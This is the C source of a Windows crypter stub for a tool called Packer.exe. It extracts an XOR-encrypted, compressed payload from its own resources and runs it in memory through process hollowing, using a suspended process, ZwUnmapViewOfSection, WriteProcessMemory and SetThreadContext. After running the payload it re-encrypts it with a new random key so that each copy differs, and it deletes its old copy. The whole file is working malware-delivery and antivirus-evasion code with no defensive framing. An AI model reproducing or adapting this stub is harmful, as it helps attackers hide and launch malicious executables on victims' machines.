/*

    Stub for Packer.exe
    Copyright (C) 2016  93aef0ce4dd141ece6f5

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
	along with this program. If not, see <http://www.gnu.org/licenses/>.

*/


#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <windows.h>
#include <wincrypt.h>
#include <zlib.h>

#define WIN32_LEAN_AND_MEAN
#define DEBUG
#define DEBUG_TITLE "STUB - DEBUG MESSAGE"

#define BUFFER_RSRC_ID 10
#define FILE_SIZE_RSRC_ID 20
#define KEY_RSRC_ID 30

#define KEY_LEN 64

typedef VOID(*PZUVOS)(HANDLE, PVOID);

typedef struct _FileStruct {
	PBYTE pBuffer;
	DWORD dwBufSize;
	DWORD dwFileSize;
	PBYTE pKey;
} FileStruct, *pFileStruct;

VOID Debug(LPCSTR fmt, ...) {
#ifdef DEBUG
	CHAR szDebugBuf[BUFSIZ];
	va_list args;

	va_start(args, fmt);
	vsprintf(szDebugBuf, fmt, args);
	MessageBox(NULL, szDebugBuf, DEBUG_TITLE, MB_OK);

	va_end(args);
#endif
}

FileStruct *ExtractPayload(VOID) {
	FileStruct *fs = (FileStruct *)malloc(sizeof(*fs));
	if (fs == NULL) return NULL;

	// get file buffer
	// get size of resource
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(BUFFER_RSRC_ID), RT_RCDATA);
	if (hRsrc == NULL) {
		Debug("Find buffer resource error: %lu\n", GetLastError());
		free(fs);
		return NULL;
	}
	fs->dwBufSize = SizeofResource(NULL, hRsrc);

	// get pointer to resource buffer
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		Debug("Load buffer resource error: %lu\n", GetLastError());
		free(fs);
		return NULL;
	}

	fs->pBuffer = (PBYTE)LockResource(hGlobal);
	if (fs->pBuffer == NULL) {
		Debug("Lock buffer resource error: %lu\n", GetLastError());
		free(fs);
		return NULL;
	}

	// get actual file size resource
	hRsrc = FindResource(NULL, MAKEINTRESOURCE(FILE_SIZE_RSRC_ID), RT_RCDATA);
	if (hRsrc == NULL) {
		Debug("Find file size error: %lu\n", GetLastError());
		free(fs);
		return NULL;
	}

	// get file size value
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		Debug("Load buffer resource error: %lu\n", GetLastError());
		free(fs);
		return NULL;
	}
	fs->dwFileSize = *(LPDWORD)LockResource(hGlobal);

	// get decryption key
	hRsrc = FindResource(NULL, MAKEINTRESOURCE(KEY_RSRC_ID), RT_RCDATA);
	if (hRsrc == NULL) {
		Debug("Find key resource error: %lu\n", GetLastError());
		free(fs);
		return NULL;
	}

	// get pointer to key buffer
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		Debug("Load key resource error: %lu\n", GetLastError());
		free(fs);
		return NULL;
	}
	fs->pKey = (PBYTE)LockResource(hGlobal);
	if (fs->pKey == NULL) {
		Debug("Lock buffer resource error: %lu\n", GetLastError());
		free(fs);
		return NULL;
	}

	return fs;
}

BOOL UpdateResources(FileStruct *fs, LPCSTR szFileName) {
	HANDLE hUpdate = BeginUpdateResource(szFileName, FALSE);
	// add file as a resource to stub
	if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(BUFFER_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs->pBuffer, fs->dwBufSize) == FALSE) {
		Debug("Update resource error: %lu\n", GetLastError());
		return FALSE;
	}

	// add decryption key as a resource
	if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(KEY_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs->pKey, KEY_LEN) == FALSE) {
		Debug("Update resource error: %lu\n", GetLastError());
		return FALSE;
	}

	if (EndUpdateResource(hUpdate, FALSE) == FALSE) {
		Debug("End update resource error: %lu\n", GetLastError());
	}

	return TRUE;
}

BOOL GenerateKey(FileStruct *fs) {
	fs->pKey = (PBYTE)malloc(KEY_LEN);
	if (fs->pKey == NULL) return FALSE;

	// initialize crypto service provider
	HCRYPTPROV hProv = NULL;
	if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, 0) == FALSE) {
		Debug("Crypt aquire context error: %lu\n", GetLastError());
		free(fs->pKey);
		return FALSE;
	}

	// generate secure bytes
	//Debug("Generating cryptographically secure bytes...\n");
	if (CryptGenRandom(hProv, KEY_LEN, fs->pKey) == FALSE) {
		Debug("Generate random key error: %lu\n", GetLastError());
		free(fs->pKey);
		return FALSE;
	}
	/*
	Debug("Using key: ");
	for (int i = 0; i < KEY_LEN; i++)
		Debug("0x%02x ", fs->pKey[i]);
	Debug("\n");
	*/

	// clean up
	CryptReleaseContext(hProv, 0);

	return TRUE;
}

// XOR
BOOL DecryptPayload(FileStruct *fs) {
	PBYTE pDecryptPayloadedBuffer = (PBYTE)malloc(fs->dwBufSize);
	if (pDecryptPayloadedBuffer == NULL) return FALSE;

	for (DWORD i = 0; i < fs->dwBufSize; i++)
		pDecryptPayloadedBuffer[i] = fs->pBuffer[i] ^ fs->pKey[i % KEY_LEN];

	fs->pBuffer = pDecryptPayloadedBuffer;

	return TRUE;
}

// XOR
BOOL Encrypt(FileStruct *fs) {
	return DecryptPayload(fs);
}

BOOL DecompressPayload(FileStruct *fs) {
	PBYTE pDecompressedBuffer = (PBYTE)malloc(fs->dwFileSize);
	ULONG ulDecompressedBufSize;
	uncompress(pDecompressedBuffer, &ulDecompressedBufSize, fs->pBuffer, fs->dwFileSize);

	fs->pBuffer = pDecompressedBuffer;
	fs->dwBufSize = ulDecompressedBufSize;

	return TRUE;
}

VOID DropAndExecutePayload(FileStruct *fs, LPCSTR szFileName) {
	DWORD dwWritten;
	HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, fs->pBuffer, fs->dwFileSize, &dwWritten, NULL);
	CloseHandle(hFile);
	ShellExecute(NULL, NULL, szFileName, NULL, NULL, SW_NORMAL);
}

BOOL MemoryExecutePayload(FileStruct *fs) {
	// PE headers
	PIMAGE_DOS_HEADER pidh;
	PIMAGE_NT_HEADERS pinh;
	PIMAGE_SECTION_HEADER pish;

	// process info
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	// pointer to virtually allocated memory
	LPVOID lpAddress = NULL;

	// context of suspended thread for setting address of entry point
	CONTEXT context;

	// need function pointer for ZwUnmapViewOfSection from ntdll.dll
	PZUVOS pZwUnmapViewOfSection = NULL;

	// get file name
	CHAR szFileName[MAX_PATH];
	GetModuleFileName(NULL, szFileName, MAX_PATH);

	// first extract header info 
	// check if valid DOS header
	pidh = (PIMAGE_DOS_HEADER)fs->pBuffer;
	if (pidh->e_magic != IMAGE_DOS_SIGNATURE) {
		Debug("DOS signature error");
		return FALSE;
	}

	// check if valid pe file
	pinh = (PIMAGE_NT_HEADERS)((DWORD)fs->pBuffer + pidh->e_lfanew);
	if (pinh->Signature != IMAGE_NT_SIGNATURE) {
		Debug("PE signature error");
		return FALSE;
	}

	// first create process as suspended
	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));
	si.cb = sizeof(si);
	if (CreateProcess(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi) == FALSE) {
		Debug("Create process error %lu\n", GetLastError());
		return FALSE;
	}

	context.ContextFlags = CONTEXT_FULL;
	if (GetThreadContext(pi.hThread, &context) == FALSE) {
		Debug("Get thread context");
	}

	// unmap memory space for our process
	pZwUnmapViewOfSection = (PZUVOS)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");
	pZwUnmapViewOfSection(pi.hProcess, (PVOID)pinh->OptionalHeader.ImageBase);

	// allocate virtual space for process
	lpAddress = VirtualAllocEx(pi.hProcess, (PVOID)pinh->OptionalHeader.ImageBase, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAddress == NULL) {
		Debug("Virtual alloc error: %lu\n", GetLastError());
		return FALSE;
	}

	// write headers into memory
	if (WriteProcessMemory(pi.hProcess, (PVOID)pinh->OptionalHeader.ImageBase, fs->pBuffer, pinh->OptionalHeader.SizeOfHeaders, NULL) == FALSE) {
		Debug ("Write headers error: %lu\n", GetLastError());
		return FALSE;
	}

	// write each section into memory
	for (int i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
		// calculate section header of each section
		pish = (PIMAGE_SECTION_HEADER)((DWORD)fs->pBuffer + pidh->e_lfanew + sizeof (IMAGE_NT_HEADERS) + sizeof (IMAGE_SECTION_HEADER) * i);
		// write section data into memory
		WriteProcessMemory(pi.hProcess, (PVOID)(pinh->OptionalHeader.ImageBase + pish->VirtualAddress), (LPVOID)((DWORD)fs->pBuffer + pish->PointerToRawData), pish->SizeOfRawData, NULL);
	}

	// set starting address at virtual address: address of entry point
	context.Eax = pinh->OptionalHeader.ImageBase + pinh->OptionalHeader.AddressOfEntryPoint;
	if (SetThreadContext(pi.hThread, &context) == FALSE) {
		Debug("Set thread context error: %lu\n", GetLastError());
		return FALSE;
	}

	// resume our suspended processes
	if (ResumeThread(pi.hThread) == -1) {
		Debug("Resume thread error: %lu\n", GetLastError());
		return FALSE;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return TRUE;
}

/*
VOID RunFromMemory(FileStruct *fs) {
	Debug("%p", fs->pBuffer);
	HMEMORYMODULE hModule = MemoryLoadLibrary(fs->pBuffer, fs->dwFileSize);
	if (hModule == NULL) {
		Debug("Memory load library error: %lu\n", GetLastError());
		return;
	}

	int nSuccess = MemoryCallEntryPoint(hModule);
	if (nSuccess < 0) {
		Debug("Memory call entry point error: %d\n", nSuccess);
	}

	MemoryFreeLibrary(hModule);
}
*/

VOID SelfDelete(LPCSTR szFileName) {
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	si.cb = sizeof(si);
	//CreateFile("old.exe", 0, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
	CHAR szCmdLine[MAX_PATH];
	sprintf(szCmdLine, "%s delete", szFileName);
	if (CreateProcess(NULL, szCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi) == FALSE) {
		Debug("Create process error: %lu\n", GetLastError());
	}
}

BOOL PolymorphPayload(LPCSTR szFileName) {
	MoveFile(szFileName, "old.exe");
	CopyFile("old.exe", szFileName, FALSE);

	// re-extract resources
	FileStruct *fs = ExtractPayload();
	if (fs == NULL) return FALSE;

	// decrypt buffer
	if (DecryptPayload(fs) == FALSE) {
		Debug("DecryptPayload buffer error: %lu\n", GetLastError());
		free(fs);
		return FALSE;
	}

	// generate new key
	if (GenerateKey(fs) == FALSE) {
		Debug("Generate key error: %lu\n", GetLastError());
		free(fs);
		return FALSE;
	}

	// encrypt with new key
	if (Encrypt(fs) == FALSE) {
		Debug("Encrypt buffer error: %lu\n", GetLastError());
		free(fs->pKey);
		return FALSE;
	}

	// update resources
	if (UpdateResources(fs, szFileName) == FALSE) {
		free(fs->pKey);
		free(fs);
		return FALSE;
	}

	SelfDelete(szFileName);

	free(fs->pKey);
	free(fs);

	return TRUE;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	if (strstr(GetCommandLine(), "delete") != NULL) {
		while (DeleteFile("old.exe") == FALSE);
	} else {
		FileStruct *fs = ExtractPayload();
		if (fs == NULL) {
			Debug("Extract file error: %lu\n", GetLastError());
			return 1;
		}

		if (DecryptPayload(fs) == TRUE) {
			if (DecompressPayload(fs) == TRUE)
				//DropAndExecutePayload(fs, "test.exe");
				MemoryExecutePayload(fs);
		}
		free(fs->pBuffer);
		free(fs);

		CHAR szFileName[MAX_PATH];
		GetModuleFileName(NULL, szFileName, MAX_PATH);
		PolymorphPayload(szFileName);
	}

	return 0;
}